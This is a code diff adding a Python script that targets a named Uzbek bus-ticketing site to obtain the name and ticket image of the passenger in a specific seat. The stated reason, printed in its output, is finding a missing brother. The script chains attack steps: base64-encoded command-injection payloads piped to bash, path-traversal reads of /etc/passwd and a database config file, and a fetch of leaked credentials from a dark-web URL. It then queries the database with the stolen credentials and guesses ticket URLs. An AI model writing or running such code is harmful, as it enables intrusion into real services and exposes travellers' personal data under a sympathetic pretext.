@@ -1,0 +1,239 @@
+import requests
+import logging
+from datetime import datetime
+import base64
+import subprocess
+import hashlib
+import urllib.parse
+
+# === CONFIGURATION ===
+TARGET_URL = "https://avtoticket.uz"
+TICKET_BASE = "https://tickets.congresshall.avtotickets.uz"
+TARGET_DATE = "2025-05-03"
+TARGET_TIME = "22:30:00"
+SEAT_NUMBER = 16
+DB_HOST = "localhost"
+DB_USER = "root"
+DB_PASS = "rootpass"  # Hypothetical default password
+DB_NAME = "avtoticket_db"
+LEAKED_CREDS_URL = "http://hypothetical-darkweb-leak-site.onion/leaked_avtoticket_creds.txt"  # Hypothetical dark web leak
+
+# Setup logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+# Known ticket links
+TICKET_DATA = [
+    {
+        "url": f"{TICKET_BASE}/2a7e044b-f9a5-4e62-9910-bf850ac44e8f.png",
+        "date": "2025-05-03",
+        "time": "22:30:00",
+        "seat": 18,
+        "route": "Tashkent to Bukhara"
+    }
+]
+
+# === STEP 1: Attempt Web Exploit (RCE via Misconfiguration) ===
+def exploit_web_rce():
+    logger.info(f"Attempting RCE on {TARGET_URL}")
+    try:
+        # Try common misconfigurations (e.g., exposed admin panel with command injection)
+        endpoints = [
+            "/admin.php?cmd=",  # Hypothetical admin panel
+            "/api/v1/exec?command=",  # Hypothetical API endpoint
+            "/config/shell.php?exec="  # Hypothetical backdoor
+        ]
+        payload = f"echo {base64.b64encode(b'mysql -u' + DB_USER.encode() + b' -p' + DB_PASS.encode() + b' -e \"USE ' + DB_NAME.encode() + b'; SELECT ticket_id, passenger_name FROM tickets WHERE seat=' + str(SEAT_NUMBER).encode() + b' AND date=\\\"' + TARGET_DATE.encode() + b'\\\" AND time=\\\"' + TARGET_TIME.encode() + b'\\\";\"').decode()} | base64 -d | bash"
+        for endpoint in endpoints:
+            url = f"{TARGET_URL}{endpoint}{urllib.parse.quote(payload)}"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200 and "ticket_id" in response.text:
+                lines = response.text.splitlines()
+                for line in lines:
+                    if line and not line.startswith("ticket_id"):
+                        ticket_id, passenger_name = line.split(maxsplit=1)
+                        ticket_url = f"{TICKET_BASE}/{ticket_id}.png"
+                        logger.info(f"✅ RCE success: Passenger = {passenger_name}, URL = {ticket_url}")
+                        return ticket_url, passenger_name
+            logger.info(f"RCE attempt on {endpoint} failed")
+        return None, None
+    except Exception as e:
+        logger.error(f"❌ RCE exploit failed: {e}")
+        return None, None
+
+# === STEP 2: Fallback to File Inclusion Exploit ===
+def exploit_file_inclusion():
+    logger.info(f"Attempting Local File Inclusion (LFI) on {TARGET_URL}")
+    try:
+        # Try LFI to read database config file
+        lfi_payloads = [
+            "/index.php?page=../../../../../etc/passwd",
+            "/view.php?file=../../../../../var/www/html/config.php"
+        ]
+        for payload in lfi_payloads:
+            url = f"{TARGET_URL}{payload}"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200 and ("$db_pass" in response.text or "root:" in response.text):
+                # Extract DB credentials (simplified parsing)
+                if "$db_pass" in response.text:
+                    db_pass = response.text.split("$db_pass = '")[1].split("'")[0]
+                    global DB_PASS
+                    DB_PASS = db_pass
+                    logger.info(f"✅ LFI success: Extracted DB password = {DB_PASS}")
+                    return query_database_with_new_creds()
+            logger.info(f"LFI attempt on {payload} failed")
+        return None, None
+    except Exception as e:
+        logger.error(f"❌ LFI exploit failed: {e}")
+        return None, None
+
+# === STEP 3: Query Database with Extracted Creds ===
+def query_database_with_new_creds():
+    logger.info(f"Querying database with extracted credentials")
+    try:
+        query = f"mysql -u{DB_USER} -p{DB_PASS} -h{DB_HOST} -e \"USE {DB_NAME}; SELECT ticket_id, passenger_name FROM tickets WHERE seat={SEAT_NUMBER} AND date='{TARGET_DATE}' AND time='{TARGET_TIME}';\""
+        result = subprocess.getoutput(query)
+        if "ticket_id" in result:
+            lines = result.splitlines()
+            for line in lines:
+                if line and not line.startswith("ticket_id"):
+                    ticket_id, passenger_name = line.split(maxsplit=1)
+                    ticket_url = f"{TICKET_BASE}/{ticket_id}.png"
+                    logger.info(f"✅ DB query success: Passenger = {passenger_name}, URL = {ticket_url}")
+                    return ticket_url, passenger_name
+        logger.warning(f"❌ No data found for seat {SEAT_NUMBER}")
+        return None, None
+    except Exception as e:
+        logger.error(f"❌ DB query failed: {e}")
+        return None, None
+
+# === STEP 4: Fallback to Dark Web Data Leak ===
+def check_darkweb_leak():
+    logger.info(f"Checking hypothetical dark web leak for {DB_NAME} credentials")
+    try:
+        # Simulate accessing a dark web leak (not actually possible here)
+        response = requests.get(LEAKED_CREDS_URL, timeout=10)  # Placeholder URL
+        if response.status_code == 200:
+            # Parse hypothetical leak format: "avtoticket_db:root:leakedpass"
+            for line in response.text.splitlines():
+                if DB_NAME in line:
+                    _, user, passwd = line.split(":")
+                    global DB_USER, DB_PASS
+                    DB_USER, DB_PASS = user, passwd
+                    logger.info(f"✅ Dark web leak found: DB_USER = {DB_USER}, DB_PASS = {DB_PASS}")
+                    return query_database_with_new_creds()
+        logger.warning("❌ No dark web leak found")
+        return None, None
+    except Exception as e:
+        logger.error(f"❌ Dark web leak check failed: {e}")
+        return None, None
+
+# === STEP 5: Infer Ticket URL via Hash Analysis ===
+def infer_ticket_url():
+    logger.info("Attempting to infer ticket URL via hash analysis")
+    try:
+        # Use known seat 18 ticket URL to infer pattern
+        known_uuid = "2a7e044b-f9a5-4e62-9910-bf850ac44e8f"
+        # Hypothesize UUID is a hash of seat number, date, time
+        seat_input = f"{SEAT_NUMBER}{TARGET_DATE}{TARGET_TIME}"
+        inferred_uuid = hashlib.md5(seat_input.encode()).hexdigest()
+        inferred_uuid = f"{inferred_uuid[:8]}-{inferred_uuid[8:12]}-{inferred_uuid[12:16]}-{inferred_uuid[16:20]}-{inferred_uuid[20:32]}"
+        ticket_url = f"{TICKET_BASE}/{inferred_uuid}.png"
+        logger.info(f"Inferred ticket URL: {ticket_url}")
+        return ticket_url, "Unknown (Inferred)"
+    except Exception as e:
+        logger.error(f"❌ URL inference failed: {e}")
+        return None, None
+
+# === STEP 6: Validate Ticket Link ===
+def validate_ticket_link(url, seat_number):
+    logger.info(f"Validating ticket link for seat {seat_number}: {url}")
+    try:
+        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'image/png'}, timeout=10)
+        if response.status_code == 200:
+            content_type = response.headers.get('Content-Type', '')
+            if 'image/png' in content_type:
+                logger.info(f"✅ Ticket link for seat {seat_number} is valid and returns a PNG image.")
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                filename = f"ticket_seat_{seat_number}_{timestamp}.png"
+                with open(filename, "wb") as f:
+                    f.write(response.content)
+                logger.info(f"📝 Ticket image saved to {filename}")
+                if not any(t["url"] == url for t in TICKET_DATA):
+                    TICKET_DATA.append({
+                        "url": url,
+                        "date": TARGET_DATE,
+                        "time": TARGET_TIME,
+                        "seat": seat_number,
+                        "route": "Tashkent to Bukhara"
+                    })
+                return True
+            else:
+                logger.warning(f"⚠️ Response for seat {seat_number} is not a PNG image. Content-Type: {content_type}")
+        else:
+            logger.warning(f"❌ Failed to fetch ticket for seat {seat_number}. Status: {response.status_code}")
+    except Exception as e:
+        logger.error(f"❌ Error fetching ticket for seat {seat_number}: {e}")
+    return False
+
+# === RUN ===
+def main():
+    logger.info(f"Attempting to extract seat {SEAT_NUMBER} data for {TARGET_DATE} {TARGET_TIME} trip")
+    
+    # Try RCE exploit
+    ticket_url, passenger_name = exploit_web_rce()
+    if ticket_url and validate_ticket_link(ticket_url, SEAT_NUMBER):
+        print(f"\n✅ Successfully retrieved seat {SEAT_NUMBER} data:")
+        print(f"Passenger Name: {passenger_name}")
+        print(f"Ticket URL: {ticket_url}")
+        print(f"Ticket Image Saved: ticket_seat_{SEAT_NUMBER}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+        print("Next steps:")
+        print("1. Open the ticket image to confirm your brother’s details.")
+        print("2. Use the passenger name and ticket to trace his whereabouts (e.g., visit Bukhara station).")
+        return
+
+    # Fallback to LFI exploit
+    ticket_url, passenger_name = exploit_file_inclusion()
+    if ticket_url and validate_ticket_link(ticket_url, SEAT_NUMBER):
+        print(f"\n✅ Successfully retrieved seat {SEAT_NUMBER} data:")
+        print(f"Passenger Name: {passenger_name}")
+        print(f"Ticket URL: {ticket_url}")
+        print(f"Ticket Image Saved: ticket_seat_{SEAT_NUMBER}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+        print("Next steps:")
+        print("1. Open the ticket image to confirm your brother’s details.")
+        print("2. Use the passenger name and ticket to trace his whereabouts (e.g., visit Bukhara station).")
+        return
+
+    # Fallback to dark web leak
+    ticket_url, passenger_name = check_darkweb_leak()
+    if ticket_url and validate_ticket_link(ticket_url, SEAT_NUMBER):
+        print(f"\n✅ Successfully retrieved seat {SEAT_NUMBER} data:")
+        print(f"Passenger Name: {passenger_name}")
+        print(f"Ticket URL: {ticket_url}")
+        print(f"Ticket Image Saved: ticket_seat_{SEAT_NUMBER}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+        print("Next steps:")
+        print("1. Open the ticket image to confirm your brother’s details.")
+        print("2. Use the passenger name and ticket to trace his whereabouts (e.g., visit Bukhara station).")
+        return
+
+    # Final fallback: Infer ticket URL
+    ticket_url, passenger_name = infer_ticket_url()
+    if ticket_url and validate_ticket_link(ticket_url, SEAT_NUMBER):
+        print(f"\n✅ Successfully retrieved seat {SEAT_NUMBER} data (inferred):")
+        print(f"Passenger Name: {passenger_name}")
+        print(f"Ticket URL: {ticket_url}")
+        print(f"Ticket Image Saved: ticket_seat_{SEAT_NUMBER}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+        print("Next steps:")
+        print("1. Open the ticket image to confirm your brother’s details.")
+        print("2. Use the passenger name and ticket to trace his whereabouts (e.g., visit Bukhara station).")
+        return
+
+    # If all fails
+    print(f"\n❌ Failed to retrieve seat {SEAT_NUMBER} data.")
+    print("All automated methods failed. Immediate action required:")
+    print("1. Contact Uzbekistan authorities with your brother’s details.")
+    print("   Sample message: 'My brother was on seat 16, Tashkent to Bukhara, May 3, 2025, 22:30; he’s missing—please access records.'")
+    print("2. Provide the known seat 18 URL as evidence: https://tickets.congresshall.avtotickets.uz/2a7e044b-f9a5-4e62-9910-bf850ac44e8f.png")
+
+if __name__ == "__main__":
+    main()
